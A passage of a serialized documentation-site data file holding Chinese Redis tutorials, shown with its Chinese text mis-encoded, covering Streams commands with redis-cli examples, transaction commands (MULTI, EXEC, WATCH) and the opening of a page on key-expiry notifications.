ç¸åï¼è¿æ¯å½ä»¤ç¨æ¥ä» streams ä¸­å é¤è¥å¹²ä¸ª entryï¼å¹¶ä¸ä¼è¿åå®éå é¤æ°ï¼è¿ä¸ªå é¤æ°å¯è½ååæ° id ä¸ªæ°ä¸ç­ï¼å ä¸ºæäº id è¡¨ç¤ºçæ¶æ¯å¯è½ä¸å­å¨ãæ§è¡å½ä»¤å¦ä¸ï¼ç¬¬äºä¸ªåæ° id æ¯ä¸å­å¨çï¼æä»¥ xdel çè¿åç»ææ¯ 1ï¼\n\n127.0.0.1:6379> xdel userinfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * ç¨æ³ï¼xlen key\n   å¾å¥½çè§£ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥è¿åç¸å key çæ°éï¼ä¸é¢åè¯´ç¸å key æ¯ä¸ä¼è¦ççï¼æ¯ç»´æ¤äºä¸ä¸ªåè¡¨ï¼æä»¥è¿ä¸ªæ¯ç¸å key åè¡¨ç sizeãæ§è¡å¦ä¸ï¼\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams ä¸ç§æ¥è¯¢æ¨¡å¼\n\nredis æä¾äºä¸ç§æ¥è¯¢ streams æ°æ®çæ¨¡å¼ï¼\n\n * èå´æ¥è¯¢ï¼å ä¸º streams çæ¯ä¸ª entryï¼å¶é»è®¤çæç id æ¯åºäºæ¶é´ä¸éå¢çï¼\n\n * çå¬æ¨¡å¼ï¼ç±»æ¯ linux ä¸­ç tailf å½ä»¤ï¼å®æ¶æ¥æ¶æ°å¢å å° streams ä¸­ç entryï¼ä¹æç¹åä¸ä¸ªæ¶æ¯ç³»ç»ï¼äºå®ä¸ç¬èè®¤ä¸ºå®å°±æ¯åé´äº kafkaï¼ï¼\n\n * æ¶è´¹èç»ï¼å³ consumer groupsï¼ç¹æ®ççå¬æ¨¡å¼ãä»ä¸ä¸ªæ¶è´¹èçè§åº¦æ¥ç streamsï¼ä¸ä¸ª streams è½è¢«ååºå°å¤ä¸ªå¤çæ¶æ¯çæ¶è´¹èï¼å¯¹äºä»»æä¸æ¡æ¶æ¯ï¼åä¸ä¸ªæ¶è´¹èç»ä¸­åªæä¸ä¸ªæ¶è´¹èå¯ä»¥å¤çï¼å kafka çæ¶è´¹èç»å®å¨ä¸æ ·ï¼ãè¿æ ·è¿è½å¤æ¨ªåæ©å®¹æ¶è´¹èï¼ä»èæåå¤çæ¶æ¯çè½åï¼èä¸éè¦åªè®©æè®©ä¸ä¸ªæ¶è´¹èå¤çæææ¶æ¯ã\n\nxrange\n\n * ç¨æ³ï¼xrange key start end [count count]\n   è¿ä¸ªå½ä»¤å±äºç¬¬ 1 ç§æ¨¡å¼ï¼å³åºäºèå´æ¥è¯¢ãè¿ä¸ªå½ä»¤ç¨æ¥è¿å streams æä¸ªé¡ºåºèå´ä¸çåç´ ï¼start åæ°æ¯æ´å°ç idï¼end åæ°æ¯æ´å¤§ç idãæä¸¤ä¸ªç¹æ®ç id ç¨ç¬¦å· "-" å "+" è¡¨ç¤ºï¼ç¬¦å· "-" è¡¨ç¤ºæå°ç idï¼ç¬¦å· "+" è¡¨ç¤ºæå¤§ç idï¼\n\n127.0.0.1:6379> xrange user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nxrange è¿è½å®ç°éåæä¸ªèå´åºé´çåè½ï¼ä¾å¦ææ³éå 2018-10-20 å·æ°å¢çç¨æ·ä¿¡æ¯ãé¦åå¾å° 2018-10-20 00:00:00 å¯¹åºçæ¶é´æ³ä¸º 1539964800000ï¼åå¾å° 2018-10-20 23:59:59 å¯¹åºçæ¶é´æ³ä¸º 1540051199000ï¼ç¶åæ§è¡å¦ä¸å½ä»¤ï¼\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * ç¨æ³ï¼xrevrange key end start [count count]\n   è¿ä¸ªå½ä»¤ä¹å±äºç¬¬ 1 ç§æ¨¡å¼ï¼ä¸å xrange ç¸åï¼è¿åä¸ä¸ªéåºèå´ãend åæ°æ¯æ´å¤§ç idï¼start åæ°æ¯æ´å°ç id\n\nxread\n\n * ç¨æ³ï¼xread [count count] [block milliseconds] streams key [key â¦] id [id â¦]\n   å¾ææ¾ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥å®ç°ç¬¬ 2 ä¸ªæ¨¡å¼ï¼å³çå¬æ¨¡å¼ãå¶ä½ç¨æ¯è¿å streams ä¸­ä»æ¥æ²¡æè¯»åçï¼ä¸æ¯åæ° id æ´å¤§çåç´ ã\n   è¿éæå¼äºä¸¤ä¸ªçªå£æµè¯ï¼ä¸ç¬¬ä¸ä¸ªæ²¡æåæ°å¢ï¼ç¬¬äºä¸ªåäºæ°å¢.\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä½¿ç¨ xread ä¼é»å¡ç¹å®æ¶é´ï¼ç­å¾æ¯æ id å¤§çæ°æ®ï¼å¦æä½¿ç¨æå° id è¿è¡æµè¯ï¼ä¼è· xrange user - + æææ¯ä¸æ ·çã\n\næ³¨æï¼block ä¸º 0 è¡¨ç¤ºä¸è´ç­å¾ç¥éææ°çæ°æ®ï¼å¦åæ°¸è¿ä¸ä¼è¶æ¶ãå¹¶ä¸ id çå¼æä»¬ç¨ç¹æ®å­ç¬¦ $ è¡¨ç¤ºï¼è¿ä¸ªç¹æ®å­ç¬¦è¡¨ç¤ºæä»¬åªè·åææ°æ·»å çæ¶æ¯ã\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread è¿æ¯æåæ¶çå¬å¤ä¸ª streams\n\n127.0.0.1:6379> xread block 0 streams user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nxread é¤äº count å blockï¼æ²¡æå¶ä»éé¡¹äºãææ xread æ¯ä¸ä¸ªéå¸¸åºæ¬çå½ä»¤ãæ´å¤é«çº§ç¹æ§å¯ä»¥å¾ä¸çæ¥ä¸æ¥è¦ä»ç»ç xreadgroupã\n\nxreadgroup\n\n * ç¨æ³ï¼xreadgroup group group consumer [count count] [block milliseconds] streams key [key â¦] id [id â¦]\n   å¾ææ¾ï¼è¿å°±æ¯ç¬¬ä¸ç§æ¨¡å¼ï¼æ¶è´¹èç»æ¨¡å¼ã\n * å¦æä½ äºè§£ kafka çæ¶è´¹èç»ï¼é£ä¹ä½ å°±ä¹äºè§£äº streams çæ¶è´¹èç»ãå¦æä¸äºè§£ä¹æ²¡å³ç³»ï¼ç¬èç®åè§£éä¸ä¸ï¼åè®¾æä¸ä¸ªæ¶è´¹è c1ï¼c2ï¼c3ãå¨ streams ä¸­æ»è®¡æ 7 æ¡æ¶æ¯ï¼1ï¼ 2ï¼ 3ï¼ 4ï¼ 5ï¼ 6ï¼ 7ï¼é£ä¹æ¶è´¹å³ç³»å¦ä¸æç¤ºï¼\n   1 -> c1\n   2 -> c2\n   3 -> c3\n   4 -> c1\n   5 -> c2\n   6 -> c3\n   7 -> c1\n * æ¶è´¹èç»å·å¤å¦ä¸å ä¸ªç¹ç¹ï¼\n   \n   * åä¸ä¸ªæ¶æ¯ä¸ä¼è¢«æéå°ä¸ä¸ªæ¶è´¹èç»ä¸çå¤ä¸ªæ¶è´¹èï¼åªå¯è½æ¯ä¸ä¸ªæ¶è´¹èã\n   \n   * åä¸ä¸ªæ¶è´¹èç»ä¸ï¼æ¯ä¸ªæ¶è´¹èé½æ¯å¯ä¸çï¼éè¿å¤§å°åææçåå­åºåã\n   \n   * æ¶è´¹èç»ä¸­çæ¶è´¹èè¯·æ±çæ¶æ¯ï¼ä¸å®æ¯æ°çï¼ä»æ¥æ²¡ææéè¿çæ¶æ¯ã\n   \n   * æ¶è´¹ä¸ä¸ªæ¶æ¯åï¼éè¦ç¨å½ä»¤ï¼xackï¼ç¡®è®¤ï¼æææ¯è¯´ï¼è¿æ¡æ¶æ¯å·²ç»ç»æåå¤çãæ­£å ä¸ºå¦æ­¤ï¼å½è®¿é® streams çåå²æ¶æ¯æ¶ï¼æ¯ä¸ªæ¶è´¹èåªè½çå°æéç»å®èªå·±çæ¶æ¯ã\n\nxack\n\n * ç¨æ³ï¼xack key group id [id â¦]\n * è¿æ¯æ¶è´¹èç»ç¸å³çå¦ä¸ä¸ªéè¦çå½ä»¤ãæ è®°ä¸ä¸ªå¤çä¸­çæ¶æ¯ä¸ºå·²è¢«æ­£ç¡®å¤çï¼å¦æ­¤ä¸æ¥ï¼è¿æ¡æ¶æ¯å°±ä¼è¢«ä»æ¶è´¹èç»ç pending æ¶æ¯éåä¸­å é¤ï¼ç±»ä¼¼ mq ä¸­ç ackã\n\nxgroup\n\n * ç¨æ³ï¼xgroup create key groupname id\n * è¿ä¹æ¯æ¶è´¹èç»çä¸ä¸ªéè¦å½ä»¤ï¼è¿ä¸ªå½ä»¤ç¨æ¥ç®¡çæ¶è´¹èç»ï¼ä¾å¦åå»ºï¼å é¤ç­ã\n   xreadgroupï¼xackï¼xgroup ä¸ç§å½ä»¤ææäºæ¶è´¹èç»ç¸å³çæä½å½ä»¤ã\n   ç®å xgroup create ç streams å¿é¡»æ¯ä¸ä¸ªå­å¨ç streamsï¼å¦åä¼æ¥éã\n   åå»ºä¸ä¸ªæ¶è´¹ç»\n\n127.0.0.1:6379> xgroup create user grp-afei $\nok\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Redisäºå¡ä»ç»",frontmatter:{title:"Redisäºå¡ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1603.Redis%E4%BA%8B%E5%8A%A1%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1603.Redisäºå¡ä»ç».md",key:"v-082b0d2c",path:"/Redis/1603/",headers:[{level:2,title:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",slug:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",normalizedTitle:"redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",charIndex:485},{level:2,title:"redisäºå¡ç¸å³å½ä»¤",slug:"redisäºå¡ç¸å³å½ä»¤",normalizedTitle:"redis äºå¡ç¸å³å½ä»¤",charIndex:904}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼ redisäºå¡ç¸å³å½ä»¤",content:"Redis æ¯æäºå¡ï¼ä½åªæ¯æäºå¡ä¸­ (A-> åå­æ§ C-> ä¸è´æ§ I-> éç¦»æ§ D-> æä¹æ§) A å Iï¼ä½¿ç¨ Redis äºå¡è¦æ³¨æä»¥ä¸ä¸¤ç¹ï¼\n1. å¨ä¸ä¸ª Redis äºå¡ä¸­ï¼Redis è¦ä¹æ§è¡å¶ä¸­çææå½ä»¤ï¼è¦ä¹ä»ä¹é½ä¸æ§è¡ãå æ­¤ï¼Redis äºå¡è½å¤ä¿è¯åå­æ§ã\n2.Redis ä¼å°ä¸ä¸ªäºå¡ä¸­çææå½ä»¤åºååï¼ç¶åæé¡ºåºæ§è¡ãRedis ä¸å¯è½å¨ä¸ä¸ª Redis äºå¡çæ§è¡è¿ç¨ä¸­æå¥æ§è¡å¦ä¸ä¸ªå®¢æ·ç«¯ååºçè¯·æ±ãè¿æ ·ä¾¿è½ä¿è¯ Redis å°è¿äºå½ä»¤ä½ä¸ºä¸ä¸ªåç¬çéç¦»æä½æ§è¡ã\n\næä»¬æ­£å¸¸çè§å¿µè®¤ä¸ºï¼å½æ§è¡æä¸ä¸ªäºå¡ä¸­ï¼ææ¥éå°±ä¼åæ»æ°æ®ï¼Redis å¹¶ä¸æ¯è¿æ ·å¤ççã é¦åæç¡®éè¿° Redis æ¯æ²¡æåæ»çãç¶åæä»¬æ¢è®¨ä¸ç´æ§çé®é¢ï¼Redis ä¸ç´æ§çå¤çæ¹å¼æ¯ï¼å¦æè¯­æ³ä¸æç¡®çåºç° ERRORï¼ä¼è®¤ä¸ºæ´ä¸ªäºå¡å°±æ¯ ERRORï¼ä½æ°æ®ä¸åºç° ERRORï¼å¶ä½å½ä»¤è¿æ¯ä¼æåã ä»¥ä¸æ¯è¯­æ³åºéï¼è¿ä¸ªäºå¡ä¹å°±æ¯éè¯¯çï¼å¯æ ä¼æ­¢çé®å¥å½ä»¤ï¼ä½é½ä¸ä¼æåã\n\n\n\nä»¥ä¸æ¯ï¼æ°æ®éè¯¯ï¼æéå¤ç key åºç°ï¼ä½å¹¶ä¸å½±åå¶ä½å½ä»¤çæä½ã\n\n\n\n\n# redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼\n\nå½æä¸ªå®¢æ·ç«¯æ­£å¨æ§è¡ä¸æ¬¡äºå¡æ¶ï¼å¦æå®å¨è°ç¨ MULTI å½ä»¤ä¹åå°±ä» Redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¸ä¼æ§è¡äºå¡ä¸­çä»»ä½æä½ï¼ç¸åï¼å¦æå®å¨è°ç¨ EXEC å½ä»¤ä¹åæä» Redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¼æ§è¡äºå¡ä¸­çæææä½ãå½ Redis ä½¿ç¨åªå¢æä»¶ï¼AOFï¼Append-only Fileï¼æ¶ï¼Redis è½å¤ç¡®ä¿ä½¿ç¨ä¸ä¸ªåç¬ç write (2) ç³»ç»è°ç¨ï¼è¿æ ·ä¾¿è½å°äºå¡åå¥ç£çã\n\nå¦æ Redis æå¡å¨å®æºï¼æèç³»ç»ç®¡çåä»¥æç§æ¹å¼åæ­¢ Redis æå¡è¿ç¨çè¿è¡ï¼é£ä¹ Redis å¾æå¯è½åªæ§è¡äºäºå¡ä¸­çä¸é¨åæä½ãRedis å°ä¼å¨éæ°å¯å¨æ¶æ£æ¥ä¸è¿°ç¶æï¼ç¶åéåºè¿è¡ï¼å¹¶ä¸è¾åºæ¥éä¿¡æ¯ã\n\nä½¿ç¨ redis-check-aof å·¥å·å¯ä»¥ä¿®å¤ä¸è¿°çåªå¢æä»¶ï¼è¿ä¸ªå·¥å·å°ä¼ä»ä¸è¿°æä»¶ä¸­å é¤æ§è¡ä¸å®å¨çäºå¡ï¼è¿æ · Redis æå¡å¨æè½åæ¬¡å¯å¨ã\n\n\n# redis äºå¡ç¸å³å½ä»¤\n\nMULTI -> ç¨äºæ è®°äºå¡åçå¼å§ãRedis ä¼å°åç»­çå½ä»¤éä¸ªæ¾å¥éåä¸­ï¼ç¶åæè½ä½¿ç¨ EXEC å½ä»¤åå­åå°æ§è¡è¿ä¸ªå½ä»¤åºåãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã\n\nEXEC -> å¨ä¸ä¸ªäºå¡ä¸­æ§è¡ææååæ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå½ä½¿ç¨ WATCH å½ä»¤æ¶ï¼åªæå½åçæ§çé®æ²¡æè¢«ä¿®æ¹æ¶ï¼EXEC å½ä»¤æä¼æ§è¡äºå¡ä¸­çå½ä»¤ï¼è¿ç§æ¹å¼å©ç¨äºæ£æ¥åè®¾ç½®ï¼CASï¼çæºå¶ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªæ°ç»ï¼å¶ä¸­çæ¯ä¸ªåç´ åå«æ¯åå­åäºå¡ä¸­çæ¯ä¸ªå½ä»¤çè¿åå¼ã å½ä½¿ç¨ WATCH å½ä»¤æ¶ï¼å¦æäºå¡æ§è¡ä¸­æ­¢ï¼é£ä¹ EXEC å½ä»¤å°±ä¼è¿åä¸ä¸ª Null å¼ã\n\nDISCARD -> æ¸é¤ææååå¨ä¸ä¸ªäºå¡ä¸­æ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå¦æä½¿ç¨äº WATCH å½ä»¤ï¼é£ä¹ DISCARD å½ä»¤å°±ä¼å°å½åè¿æ¥çæ§çææé®åæ¶çæ§ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã\n\n\n\nWATCH -> å½æä¸ªäºå¡éè¦ææ¡ä»¶æ§è¡æ¶ï¼å°±è¦ä½¿ç¨è¿ä¸ªå½ä»¤å°ç»å®çé®è®¾ç½®ä¸ºåçæ§çãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKãå¯¹äºæ¯ä¸ªé®æ¥è¯´ï¼æ¶é´å¤æåº¦æ»æ¯ O (1)ã\n\nä»¥ä¸æ¼ç¤ºäº watch ä¹è§é çç¤ºä¾ï¼(1) å½ä¸ä¸ªå®¢æ·ç«¯ (A) å¯¹ä¸ä¸ªåé (a) è¿è¡äºçå¬æ­¤æ¶ a = 3 å¹¶å¼å¯äºäºå¡ï¼å¦ä¸ä¸ªå®¢æ·ç«¯ (B) æ¹åäº a çå¼ a = 4ï¼é£ä¹ (A) å®¢æ·ç«¯æ§è¡å®äºå¡åï¼exec ä¼è¿å nil (null) ï¼(2) å¦ææ²¡æç«äºï¼åæ­£ç¡®æ§è¡ã\n\n\n\n\n\nwatch ä¸å®æ¯åäºå¡ä¸èµ·ä½¿ç¨æææã\n\nUNWATCH -> æ¸é¤ææååä¸ºä¸ä¸ªäºå¡çæ§çé®ãå¦æä½ è°ç¨äº EXEC æ DISCARD å½ä»¤ï¼é£ä¹å°±ä¸éè¦æå¨è°ç¨ UNWATCH å½ä»¤ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã",normalizedContent:"redis æ¯æäºå¡ï¼ä½åªæ¯æäºå¡ä¸­ (a-> åå­æ§ c-> ä¸è´æ§ i-> éç¦»æ§ d-> æä¹æ§) a å iï¼ä½¿ç¨ redis äºå¡è¦æ³¨æä»¥ä¸ä¸¤ç¹ï¼\n1. å¨ä¸ä¸ª redis äºå¡ä¸­ï¼redis è¦ä¹æ§è¡å¶ä¸­çææå½ä»¤ï¼è¦ä¹ä»ä¹é½ä¸æ§è¡ãå æ­¤ï¼redis äºå¡è½å¤ä¿è¯åå­æ§ã\n2.redis ä¼å°ä¸ä¸ªäºå¡ä¸­çææå½ä»¤åºååï¼ç¶åæé¡ºåºæ§è¡ãredis ä¸å¯è½å¨ä¸ä¸ª redis äºå¡çæ§è¡è¿ç¨ä¸­æå¥æ§è¡å¦ä¸ä¸ªå®¢æ·ç«¯ååºçè¯·æ±ãè¿æ ·ä¾¿è½ä¿è¯ redis å°è¿äºå½ä»¤ä½ä¸ºä¸ä¸ªåç¬çéç¦»æä½æ§è¡ã\n\næä»¬æ­£å¸¸çè§å¿µè®¤ä¸ºï¼å½æ§è¡æä¸ä¸ªäºå¡ä¸­ï¼ææ¥éå°±ä¼åæ»æ°æ®ï¼redis å¹¶ä¸æ¯è¿æ ·å¤ççã é¦åæç¡®éè¿° redis æ¯æ²¡æåæ»çãç¶åæä»¬æ¢è®¨ä¸ç´æ§çé®é¢ï¼redis ä¸ç´æ§çå¤çæ¹å¼æ¯ï¼å¦æè¯­æ³ä¸æç¡®çåºç° errorï¼ä¼è®¤ä¸ºæ´ä¸ªäºå¡å°±æ¯ errorï¼ä½æ°æ®ä¸åºç° errorï¼å¶ä½å½ä»¤è¿æ¯ä¼æåã ä»¥ä¸æ¯è¯­æ³åºéï¼è¿ä¸ªäºå¡ä¹å°±æ¯éè¯¯çï¼å¯æ ä¼æ­¢çé®å¥å½ä»¤ï¼ä½é½ä¸ä¼æåã\n\n\n\nä»¥ä¸æ¯ï¼æ°æ®éè¯¯ï¼æéå¤ç key åºç°ï¼ä½å¹¶ä¸å½±åå¶ä½å½ä»¤çæä½ã\n\n\n\n\n# redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼\n\nå½æä¸ªå®¢æ·ç«¯æ­£å¨æ§è¡ä¸æ¬¡äºå¡æ¶ï¼å¦æå®å¨è°ç¨ multi å½ä»¤ä¹åå°±ä» redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¸ä¼æ§è¡äºå¡ä¸­çä»»ä½æä½ï¼ç¸åï¼å¦æå®å¨è°ç¨ exec å½ä»¤ä¹åæä» redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¼æ§è¡äºå¡ä¸­çæææä½ãå½ redis ä½¿ç¨åªå¢æä»¶ï¼aofï¼append-only fileï¼æ¶ï¼redis è½å¤ç¡®ä¿ä½¿ç¨ä¸ä¸ªåç¬ç write (2) ç³»ç»è°ç¨ï¼è¿æ ·ä¾¿è½å°äºå¡åå¥ç£çã\n\nå¦æ redis æå¡å¨å®æºï¼æèç³»ç»ç®¡çåä»¥æç§æ¹å¼åæ­¢ redis æå¡è¿ç¨çè¿è¡ï¼é£ä¹ redis å¾æå¯è½åªæ§è¡äºäºå¡ä¸­çä¸é¨åæä½ãredis å°ä¼å¨éæ°å¯å¨æ¶æ£æ¥ä¸è¿°ç¶æï¼ç¶åéåºè¿è¡ï¼å¹¶ä¸è¾åºæ¥éä¿¡æ¯ã\n\nä½¿ç¨ redis-check-aof å·¥å·å¯ä»¥ä¿®å¤ä¸è¿°çåªå¢æä»¶ï¼è¿ä¸ªå·¥å·å°ä¼ä»ä¸è¿°æä»¶ä¸­å é¤æ§è¡ä¸å®å¨çäºå¡ï¼è¿æ · redis æå¡å¨æè½åæ¬¡å¯å¨ã\n\n\n# redis äºå¡ç¸å³å½ä»¤\n\nmulti -> ç¨äºæ è®°äºå¡åçå¼å§ãredis ä¼å°åç»­çå½ä»¤éä¸ªæ¾å¥éåä¸­ï¼ç¶åæè½ä½¿ç¨ exec å½ä»¤åå­åå°æ§è¡è¿ä¸ªå½ä»¤åºåãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã\n\nexec -> å¨ä¸ä¸ªäºå¡ä¸­æ§è¡ææååæ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå½ä½¿ç¨ watch å½ä»¤æ¶ï¼åªæå½åçæ§çé®æ²¡æè¢«ä¿®æ¹æ¶ï¼exec å½ä»¤æä¼æ§è¡äºå¡ä¸­çå½ä»¤ï¼è¿ç§æ¹å¼å©ç¨äºæ£æ¥åè®¾ç½®ï¼casï¼çæºå¶ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªæ°ç»ï¼å¶ä¸­çæ¯ä¸ªåç´ åå«æ¯åå­åäºå¡ä¸­çæ¯ä¸ªå½ä»¤çè¿åå¼ã å½ä½¿ç¨ watch å½ä»¤æ¶ï¼å¦æäºå¡æ§è¡ä¸­æ­¢ï¼é£ä¹ exec å½ä»¤å°±ä¼è¿åä¸ä¸ª null å¼ã\n\ndiscard -> æ¸é¤ææååå¨ä¸ä¸ªäºå¡ä¸­æ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå¦æä½¿ç¨äº watch å½ä»¤ï¼é£ä¹ discard å½ä»¤å°±ä¼å°å½åè¿æ¥çæ§çææé®åæ¶çæ§ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã\n\n\n\nwatch -> å½æä¸ªäºå¡éè¦ææ¡ä»¶æ§è¡æ¶ï¼å°±è¦ä½¿ç¨è¿ä¸ªå½ä»¤å°ç»å®çé®è®¾ç½®ä¸ºåçæ§çãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okãå¯¹äºæ¯ä¸ªé®æ¥è¯´ï¼æ¶é´å¤æåº¦æ»æ¯ o (1)ã\n\nä»¥ä¸æ¼ç¤ºäº watch ä¹è§é çç¤ºä¾ï¼(1) å½ä¸ä¸ªå®¢æ·ç«¯ (a) å¯¹ä¸ä¸ªåé (a) è¿è¡äºçå¬æ­¤æ¶ a = 3 å¹¶å¼å¯äºäºå¡ï¼å¦ä¸ä¸ªå®¢æ·ç«¯ (b) æ¹åäº a çå¼ a = 4ï¼é£ä¹ (a) å®¢æ·ç«¯æ§è¡å®äºå¡åï¼exec ä¼è¿å nil (null) ï¼(2) å¦ææ²¡æç«äºï¼åæ­£ç¡®æ§è¡ã\n\n\n\n\n\nwatch ä¸å®æ¯åäºå¡ä¸èµ·ä½¿ç¨æææã\n\nunwatch -> æ¸é¤ææååä¸ºä¸ä¸ªäºå¡çæ§çé®ãå¦æä½ è°ç¨äº exec æ discard å½ä»¤ï¼é£ä¹å°±ä¸éè¦æå¨è°ç¨ unwatch å½ä»¤ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã",charsets:{cjk:!0}},{title:"Redisçkeyå¤±æéç¥ä»ç»",frontmatter:{title:"Redisçkeyå¤±æéç¥ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1604.Redis%E7%9A%84key%E5%A4%B1%E6%95%88%E9%80%9A%E7%9F%A5%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1604.Redisçkeyå¤±æéç¥ä»ç».md",key:"v-eca50964",path:"/Redis/1604/",headers:[{level:2,title:"ä¿®æ¹ redis.conf éç½®",slug:"ä¿®æ¹-redis-conf-éç½®",normalizedTitle:"ä¿®æ¹ redis.conf éç½®",charIndex:2},{level:2,title:"spring boot redis key å¤±æéç¥éç½®",slug:"spring-boot-redis-key-å¤±æéç¥éç½®",normalizedTitle:"spring boot redis key å¤±æéç¥éç½®",charIndex:815},{level:3,title:"æ·»å éç½®ç±»",slug:"æ·»å éç½®ç±»",normalizedTitle:"æ·»å éç½®ç±»",charIndex:848},{level:3,title:"æ¥å£",slug:"æ¥å£",normalizedTitle:"æ¥å£",charIndex:3496},{level:3,title:"å®ç°ç±»",slug:"å®ç°ç±»",normalizedTitle:"å®ç°ç±»",charIndex:3875}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¿®æ¹ redis.conf éç½® spring boot redis key å¤±æéç¥éç½® æ·»å éç½®ç±» æ¥å£ å®ç°ç±»",content:'# ä¿®æ¹ redis.conf éç½®\n\næ¾å° notify-keyspace-events å¹¶å° notify-keyspace-events ä¿®æ¹ä¸º notify-keyspace-events Ex\n\n\n\néç½® Ex å¯¹åºçææå¦ä¸ï¼ E: é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼ x: è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n\n * K é®ç©ºé´éç¥ï¼ä»¥ __keyspace@<db>__ ä¸ºåç¼\n * E é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ 